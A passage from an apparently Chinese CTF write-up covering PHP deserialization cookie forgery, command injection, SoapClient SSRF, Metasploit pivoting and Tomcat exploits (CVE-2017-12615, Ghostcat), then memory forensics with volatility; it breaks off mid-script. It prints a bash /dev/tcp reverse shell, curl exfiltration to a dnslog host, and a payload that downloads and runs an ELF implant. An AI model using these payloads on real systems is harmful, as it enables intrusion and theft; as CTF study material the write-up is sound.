+        <span class=p>}</span>
+        <span class=nv>$o</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$uid</span><span class=p>);</span>
+        <span class=k>echo</span> <span class=nv>$o</span><span class=o>-&gt;</span><span class=na>show</span><span class=p>();</span>
+        <span class=k>if</span> <span class=p>(</span><span class=nv>$o</span><span class=o>-&gt;</span><span class=na>username</span> <span class=o>===</span> <span class=s2>&#34;admin&#34;</span><span class=p>){</span>
+            <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span><span class=p>;</span>
+            <span class=k>include</span> <span class=s2>&#34;hint.php&#34;</span><span class=p>;</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+</code></pre></td></tr></table></div></div><p>审计源码后发现若第一次访问就存在<code>$_COOKIE['user'] 和 $_COOKIE['hash']</code>则<code>$_SESSION['key'] 和 $_SESSION['key']</code>的值就为null，我们用null为密钥和向量加密payload即可控制uid的值。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>include</span> <span class=s2>&#34;user.php&#34;</span><span class=p>;</span>
+<span class=nv>$user</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>User</span><span class=p>(</span><span class=s1>&#39;admin&#39;</span><span class=p>);</span>
+<span class=nv>$userStr</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$user</span><span class=p>);</span>
+<span class=nv>$cipher</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span><span class=nv>$userStr</span><span class=p>,</span> <span class=s2>&#34;des-cbc&#34;</span><span class=p>,</span> <span class=k>null</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
+<span class=c1>//检验一下解密是否正常
+</span><span class=c1></span><span class=nv>$uid</span> <span class=o>=</span> <span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>,</span> <span class=s1>&#39;des-cbc&#39;</span><span class=p>,</span> <span class=k>null</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
+<span class=nv>$hash</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$uid</span><span class=p>);</span>
+<span class=k>echo</span> <span class=s1>&#39;user=&#39;</span><span class=o>.</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;; hash=&#39;</span><span class=o>.</span><span class=nv>$hash</span><span class=p>;</span>
+<span class=c1>//user=b3hIekw5Mk82WTQwbUk1M3RHYThQR0V4UmVZeHVSdE1ranZRYk43eksyVXhaTnFQZ2l1YkRKc0dpd1Z5cUlzVg==; hash=abc2f600e79557ef90ca4e07516b486f
+</span></code></pre></td></tr></table></div></div><p>cookie伪造后以admin身份登入，发现hint（其实源码里可以发现hint.php，web访问即可看到hint，但是对这题没有影响）。</p><p><figure><a class=lightgallery href=image-20200309044415844.png title=image-20200309044415844 data-thumbnail=image-20200309044415844.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309044415844.png, image-20200309044415844.png 1.5x, image-20200309044415844.png 2x" data-src=image-20200309044415844.png alt=image-20200309044415844></a><figcaption class=image-caption>image-20200309044415844</figcaption></figure></p><h4 id=内网机11010112>内网机1（10.10.1.12）</h4><p>限制6个字符的eval，我卡在这边好久，后来想到一个巧妙的payload，不知道师傅们是怎么解的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>index.php?cc=`$cc`;whoami
+</code></pre></td></tr></table></div></div><p>因为没有回显所以首选反弹shell，其次是curl外带数据或者dnslog，后面我尝试过<code>bash -i >& /dev/tcp/ip/port 0>&1</code>但是没有成功，然后就curl外带数据。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>index.php?cc=`$cc`;curl http://BuGaoSuNi.ceye.io/`ls|base64|cut -c 1-10`
+index.php?cc=`$cc`;curl http://BuGaoSuNi.ceye.io/`ls|base64|cut -c 11-20`
+...
+</code></pre></td></tr></table></div></div><p>payload构造好之后利用反序列化配合soap达到ssrf的效果，后面打到10.10.1.12拿到/hint</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>your next target is in 10.10.2.13:8080
+enjoy it!
+</code></pre></td></tr></table></div></div><p>还要打内网，那就上msf生成elf马，上传至vps，用下面的payload构造cookie，触发meterpreter shell（我是用frp做的内网穿透，所以地址会是127.0.0.1）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+<span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;http://10.10.1.12/index.php?cc=`$cc`;curl http://MyVPSIp/frieggs.elf&gt;/tmp/frieggs.elf%26%26chmod 777 /tmp/frieggs.elf%26%26/tmp/frieggs.elf&#39;</span><span class=p>,</span>
+    <span class=s1>&#39;uri&#39;</span>      <span class=o>=&gt;</span> <span class=s2>&#34;123&#34;</span><span class=p>));</span>
+<span class=nv>$s</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
+<span class=nv>$cipher</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span><span class=nv>$s</span><span class=p>,</span> <span class=s2>&#34;des-cbc&#34;</span><span class=p>,</span> <span class=k>null</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
+<span class=nv>$uid</span> <span class=o>=</span> <span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>,</span> <span class=s1>&#39;des-cbc&#39;</span><span class=p>,</span> <span class=k>null</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
+<span class=nv>$hash</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$uid</span><span class=p>);</span>
+<span class=k>echo</span> <span class=s1>&#39;user=&#39;</span><span class=o>.</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$cipher</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;; hash=&#39;</span><span class=o>.</span><span class=nv>$hash</span><span class=p>;</span>
+</code></pre></td></tr></table></div></div><p><figure><a class=lightgallery href=image-20200309050615304.png title=image-20200309050615304 data-thumbnail=image-20200309050615304.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309050615304.png, image-20200309050615304.png 1.5x, image-20200309050615304.png 2x" data-src=image-20200309050615304.png alt=image-20200309050615304></a><figcaption class=image-caption>image-20200309050615304</figcaption></figure></p><p><figure><a class=lightgallery href=image-20200309050713713.png title=image-20200309050713713 data-thumbnail=image-20200309050713713.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309050713713.png, image-20200309050713713.png 1.5x, image-20200309050713713.png 2x" data-src=image-20200309050713713.png alt=image-20200309050713713></a><figcaption class=image-caption>image-20200309050713713</figcaption></figure></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell><span class=c1>#将session切换至后台</span>
+$ meterpreter &gt; <span class=nb>bg</span>
+<span class=c1>#添加一条内网路由</span>
+$ msf5 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; route add 10.10.0.0 255.255.0.0 <span class=m>6</span>
+<span class=c1>#创建msf sock4a代理</span>
+$ msf5 exploit<span class=o>(</span>multi/handler<span class=o>)</span> &gt; use auxiliary/server/socks4a
+$ msf5 auxiliary<span class=o>(</span>server/socks4a<span class=o>)</span> &gt; run
+<span class=o>[</span>*<span class=o>]</span> Auxiliary module running as background job 5.
+
+<span class=o>[</span>*<span class=o>]</span> Starting the socks4a proxy server
+</code></pre></td></tr></table></div></div><h4 id=内网机21010213>内网机2（10.10.2.13）</h4><p>挂上内网代理后发现是Tomcat 8.5.19</p><p><figure><a class=lightgallery href=image-20200309051248048.png title=image-20200309051248048 data-thumbnail=image-20200309051248048.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309051248048.png, image-20200309051248048.png 1.5x, image-20200309051248048.png 2x" data-src=image-20200309051248048.png alt=image-20200309051248048></a><figcaption class=image-caption>image-20200309051248048</figcaption></figure></p><h5 id=cve-2017-12615tomcat任意文件上传漏洞>CVE-2017-12615（Tomcat任意文件上传漏洞）</h5><p>这里要吐槽一下postman，这么好用的工具竟然只支持http代理，不支持socks代理，还得用Privoxy转发http代理。。。</p><p><figure><a class=lightgallery href=image-20200309051850367.png title=put上传 data-thumbnail=image-20200309051850367.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309051850367.png, image-20200309051850367.png 1.5x, image-20200309051850367.png 2x" data-src=image-20200309051850367.png alt=put上传></a><figcaption class=image-caption>put上传</figcaption></figure></p><p><figure><a class=lightgallery href=image-20200309052111575.png title=get验证上传成功 data-thumbnail=image-20200309052111575.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309052111575.png, image-20200309052111575.png 1.5x, image-20200309052111575.png 2x" data-src=image-20200309052111575.png alt=get验证上传成功></a><figcaption class=image-caption>get验证上传成功</figcaption></figure></p><h5 id=cnvd-2020-10487tomcat本地文件包含漏洞>CNVD-2020-10487（Tomcat本地文件包含漏洞）</h5><p><figure><a class=lightgallery href=image-20200309063050849.png title=用proxifier代理python程序到内网 data-thumbnail=image-20200309063050849.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309063050849.png, image-20200309063050849.png 1.5x, image-20200309063050849.png 2x" data-src=image-20200309063050849.png alt=用proxifier代理python程序到内网></a><figcaption class=image-caption>用proxifier代理python程序到内网</figcaption></figure></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>$ python ajpShooter.py http://10.10.2.13:8080/ <span class=m>8009</span> /frieggs.txt <span class=nb>eval</span>
+
+       _    _         __ _                 _
+      /_<span class=se>\ </span> <span class=o>(</span>_<span class=o>)</span>_ __   / _<span class=se>\ </span><span class=p>|</span>__   ___   ___ <span class=p>|</span> <span class=p>|</span>_ ___ _ __
+     //_<span class=se>\\</span> <span class=p>|</span> <span class=p>|</span> <span class=s1>&#39;_ \  \ \| &#39;</span>_ <span class=se>\ </span>/ _ <span class=se>\ </span>/ _ <span class=se>\|</span> __/ _ <span class=se>\ </span><span class=err>&#39;</span>__<span class=p>|</span>
+    /  _  <span class=se>\|</span> <span class=p>|</span> <span class=p>|</span>_<span class=o>)</span> <span class=p>|</span> _<span class=se>\ \ </span><span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=o>||</span>  __/ <span class=p>|</span>
+    <span class=se>\_</span>/ <span class=se>\_</span>// <span class=p>|</span> .__/  <span class=se>\_</span>_/_<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span><span class=se>\_</span>__/ <span class=se>\_</span>__/ <span class=se>\_</span>_<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>
+         <span class=p>|</span>__/<span class=p>|</span>_<span class=p>|</span>
+                                                00theway,just <span class=k>for</span> <span class=nb>test</span>
+
+
+<span class=o>[</span>&lt;<span class=o>]</span> <span class=m>200</span> <span class=m>200</span>
+<span class=o>[</span>&lt;<span class=o>]</span> Set-Cookie: <span class=nv>JSESSIONID</span><span class=o>=</span>13FD21BEF3EB66C6BFFEE7ECD93A0410<span class=p>;</span> <span class=nv>Path</span><span class=o>=</span>/<span class=p>;</span> HttpOnly
+<span class=o>[</span>&lt;<span class=o>]</span> Content-Type: text/html<span class=p>;</span><span class=nv>charset</span><span class=o>=</span>ISO-8859-1
+<span class=o>[</span>&lt;<span class=o>]</span> Content-Length: <span class=m>23</span>
+
+flag<span class=o>{</span>xGJpVxvjqRcwCQZR<span class=o>}</span>
+</code></pre></td></tr></table></div></div><h2 id=misc>MISC</h2><p><figure><a class=lightgallery href=image-20200309054913169.png title=从流量中导出data.zip data-thumbnail=image-20200309054913169.png><img class=lazyload src=/svg/loading.min.svg data-sizes=auto data-srcset="image-20200309054913169.png, image-20200309054913169.png 1.5x, image-20200309054913169.png 2x" data-src=image-20200309054913169.png alt=从流量中导出data.zip></a><figcaption class=image-caption>从流量中导出data.zip</figcaption></figure></p><p>导出的zip文件头有多余的数据，删除后多余数据后打开压缩包拿到内存dump文件，用volatility分析内存</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell>$ volatility -f data.vmem imageinfo
+Volatility Foundation Volatility Framework 2.6
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile<span class=o>(</span>s<span class=o>)</span> : WinXPSP2x86, WinXPSP3x86 <span class=o>(</span>Instantiated with WinXPSP2x86<span class=o>)</span>
+                     AS Layer1 : IA32PagedMemoryPae <span class=o>(</span>Kernel AS<span class=o>)</span>
+                     AS Layer2 : FileAddressSpace <span class=o>(</span>/home/kali/data.vmem<span class=o>)</span>
+                      PAE <span class=nb>type</span> : PAE
+                           DTB : 0xb18000L
+                          KDBG : 0x80546ae0L
+          Number of Processors : <span class=m>1</span>
+     Image Type <span class=o>(</span>Service Pack<span class=o>)</span> : <span class=m>3</span>
+                KPCR <span class=k>for</span> CPU <span class=m>0</span> : 0xffdff000L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image date and <span class=nb>time</span> : 2020-02-24 07:56:47 UTC+0000
+     Image <span class=nb>local</span> date and <span class=nb>time</span> : 2020-02-24 15:56:47 +0800
+
+$ volatility -f data.vmem --profile<span class=o>=</span>WinXPSP3x86 pslist
+Volatility Foundation Volatility Framework 2.6
+Offset<span class=o>(</span>V<span class=o>)</span>  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
+---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
+0x80ea2660 System                    <span class=m>4</span>      <span class=m>0</span>     <span class=m>52</span>      <span class=m>231</span> ------      <span class=m>0</span>                                                              
+0xff57fc28 smss.exe                <span class=m>372</span>      <span class=m>4</span>      <span class=m>3</span>       <span class=m>19</span> ------      <span class=m>0</span> 2020-02-23 13:17:13 UTC+0000                                 
+0xff432020 csrss.exe               <span class=m>464</span>    <span class=m>372</span>     <span class=m>12</span>      <span class=m>317</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:13 UTC+0000                                 
+0xff435020 winlogon.exe            <span class=m>492</span>    <span class=m>372</span>     <span class=m>20</span>      <span class=m>501</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:13 UTC+0000                                 
+0xff445020 services.exe            <span class=m>668</span>    <span class=m>492</span>     <span class=m>16</span>      <span class=m>253</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff46b020 lsass.exe               <span class=m>680</span>    <span class=m>492</span>     <span class=m>19</span>      <span class=m>309</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff510bf0 vmacthlp.exe            <span class=m>836</span>    <span class=m>668</span>      <span class=m>1</span>       <span class=m>25</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff493568 svchost.exe             <span class=m>848</span>    <span class=m>668</span>     <span class=m>14</span>      <span class=m>189</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff491a78 svchost.exe             <span class=m>932</span>    <span class=m>668</span>     <span class=m>11</span>      <span class=m>230</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff416b10 svchost.exe            <span class=m>1024</span>    <span class=m>668</span>     <span class=m>44</span>      <span class=m>939</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0x80dac020 svchost.exe            <span class=m>1072</span>    <span class=m>668</span>      <span class=m>4</span>       <span class=m>57</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff4ca4e0 svchost.exe            <span class=m>1132</span>    <span class=m>668</span>      <span class=m>7</span>      <span class=m>118</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:14 UTC+0000                                 
+0xff30d020 explorer.exe           <span class=m>1476</span>   <span class=m>1400</span>     <span class=m>13</span>      <span class=m>481</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:15 UTC+0000                                 
+0xff51d468 spoolsv.exe            <span class=m>1568</span>    <span class=m>668</span>     <span class=m>10</span>      <span class=m>120</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:15 UTC+0000                                 
+0xff5793d8 VGAuthService.e        <span class=m>1932</span>    <span class=m>668</span>      <span class=m>2</span>       <span class=m>60</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:33 UTC+0000                                 
+0xff576da0 vmtoolsd.exe           <span class=m>2008</span>    <span class=m>668</span>      <span class=m>7</span>      <span class=m>265</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:40 UTC+0000                                 
+0xff4afda0 wmiprvse.exe            <span class=m>540</span>    <span class=m>848</span>     <span class=m>13</span>      <span class=m>242</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:41 UTC+0000                                 
+0xff486da0 vmtoolsd.exe            <span class=m>588</span>   <span class=m>1476</span>      <span class=m>6</span>      <span class=m>229</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:41 UTC+0000                                 
+0xff47dda0 ctfmon.exe              <span class=m>596</span>   <span class=m>1476</span>      <span class=m>1</span>       <span class=m>71</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:17:41 UTC+0000                                 
+0xff5b57b8 cmd.exe                <span class=m>1396</span>   <span class=m>1476</span>      <span class=m>1</span>       <span class=m>61</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:24:09 UTC+0000                                 
+0xff4583c0 conime.exe              <span class=m>544</span>   <span class=m>1396</span>      <span class=m>1</span>       <span class=m>38</span>      <span class=m>0</span>      <span class=m>0</span> 2020-02-23 13:24:09 UTC+0000
+
+$ volatility -f data.vmem --profile<span class=o>=</span>WinXPSP3x86 cmdscan
+Volatility Foundation Volatility Framework 2.6
+
+**************************************************
+CommandProcess: csrss.exe Pid: <span class=m>464</span>
+CommandHistory: 0x556bb8 Application: cmd.exe Flags: Allocated, Reset
+CommandCount: <span class=m>2</span> LastAdded: <span class=m>1</span> LastDisplayed: <span class=m>1</span>
+FirstCommand: <span class=m>0</span> CommandCountMax: <span class=m>50</span>
+ProcessHandle: 0x504
+Cmd <span class=c1>#0 @ 0x3609ea0: passwd:weak_auth_top100</span>
+Cmd <span class=c1>#1 @ 0x5576d0: start wireshark</span>
+Cmd <span class=c1>#13 @ 0x9f009f: ??</span>
+Cmd <span class=c1>#41 @ 0x9f003f: ?\?????????</span>
+
+$ volatility -f data.vmem --profile<span class=o>=</span>WinXPSP3x86 filescan<span class=p>|</span>grep flag
+Volatility Foundation Volatility Framework 2.6
+0x0000000001155f90      <span class=m>1</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume1<span class=se>\D</span>ocuments and Settings<span class=se>\A</span>dministrator<span class=se>\f</span>lag.img
+
+$ volatility -f data.vmem --profile<span class=o>=</span>WinXPSP3x86 dumpfiles -Q 0x0000000001155f90 --dump-dir<span class=o>=</span>./
+Volatility Foundation Volatility Framework 2.6
+DataSectionObject 0x01155f90   None   <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume1<span class=se>\D</span>ocuments and Settings<span class=se>\A</span>dministrator<span class=se>\f</span>lag.img
+
+$ file file.None.0xff425090.dat 
+file.None.0xff425090.dat: DOS/MBR boot sector, code offset 0x58+2, OEM-ID <span class=s2>&#34;SYSLINUX&#34;</span>, sectors/cluster 2, root entries 112, sectors <span class=m>360</span> <span class=o>(</span>volumes &lt;<span class=o>=</span><span class=m>32</span> MB<span class=o>)</span>, Media descriptor 0xfd, sectors/FAT 1, sectors/track 9, heads 1, reserved 0x1, serial number 0x5d307603, label: <span class=s2>&#34;FDD_BOOT   &#34;</span>, FAT <span class=o>(</span><span class=m>12</span> bit<span class=o>)</span>, followed by FAT
+
+$ mkdir <span class=nb>test</span>
+$ sudo mount file.None.0xff425090.dat <span class=nb>test</span>
+$ tree <span class=nb>test</span>
+<span class=nb>test</span>
+├── ldlinux.sys
+└── newfolder
+    └── newfolder
+        ├── newfolder
+        │   └── newfolder
+        │       ├── newfolder
+        │       │   └── newfolder
+        │       │       └── newfolder
+        │       │           └── newfolder
+        │       └── newfolder1
+        │           └── newfolder1
+        │               └── newfolder1
+        │                   └── newfolder1
+        │                       └── newfolder1
+        │                           └── usbdata.zip
+        └── newfolder1
+            └── newfolder1
+                └── newfolder1
+                    └── newfolder1
+                        └── newfolder1
+                            ├── newfolder
+                            └── newfolder1
+
+<span class=m>20</span> directories, <span class=m>2</span> files
+</code></pre></td></tr></table></div></div><p>用<code>weak_auth_top100</code>作为密码解压usbdata.zip，拿到usbdata.txt，再用以下脚本解析usb流量数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
+
+<span class=kn>import</span> <span class=nn>sys</span>
+<span class=kn>import</span> <span class=nn>os</span>
+
+<span class=n>DataFileName</span> <span class=o>=</span> <span class=s2>&#34;usbdata.txt&#34;</span>
+
+<span class=n>presses</span> <span class=o>=</span> <span class=p>[]</span>
+
+<span class=n>normalKeys</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;04&#34;</span><span class=p>:</span><span class=s2>&#34;a&#34;</span><span class=p>,</span> <span class=s2>&#34;05&#34;</span><span class=p>:</span><span class=s2>&#34;b&#34;</span><span class=p>,</span> <span class=s2>&#34;06&#34;</span><span class=p>:</span><span class=s2>&#34;c&#34;</span><span class=p>,</span> <span class=s2>&#34;07&#34;</span><span class=p>:</span><span class=s2>&#34;d&#34;</span><span class=p>,</span> <span class=s2>&#34;08&#34;</span><span class=p>:</span><span class=s2>&#34;e&#34;</span><span class=p>,</span> <span class=s2>&#34;09&#34;</span><span class=p>:</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=s2>&#34;0a&#34;</span><span class=p>:</span><span class=s2>&#34;g&#34;</span><span class=p>,</span> <span class=s2>&#34;0b&#34;</span><span class=p>:</span><span class=s2>&#34;h&#34;</span><span class=p>,</span> <span class=s2>&#34;0c&#34;</span><span class=p>:</span><span class=s2>&#34;i&#34;</span><span class=p>,</span> <span class=s2>&#34;0d&#34;</span><span class=p>:</span><span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;0e&#34;</span><span class=p>:</span><span class=s2>&#34;k&#34;</span><span class=p>,</span> <span class=s2>&#34;0f&#34;</span><span class=p>:</span><span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;10&#34;</span><span class=p>:</span><span class=s2>&#34;m&#34;</span><span class=p>,</span> <span class=s2>&#34;11&#34;</span><span class=p>:</span><span class=s2>&#34;n&#34;</span><span class=p>,</span> <span class=s2>&#34;12&#34;</span><span class=p>:</span><span class=s2>&#34;o&#34;</span><span class=p>,</span> <span class=s2>&#34;13&#34;</span><span class=p>:</span><span class=s2>&#34;p&#34;</span><span class=p>,</span> <span class=s2>&#34;14&#34;</span><span class=p>:</span><span class=s2>&#34;q&#34;</span><span class=p>,</span> <span class=s2>&#34;15&#34;</span><span class=p>:</span><span class=s2>&#34;r&#34;</span><span class=p>,</span> <span class=s2>&#34;16&#34;</span><span class=p>:</span><span class=s2>&#34;s&#34;</span><span class=p>,</span> <span class=s2>&#34;17&#34;</span><span 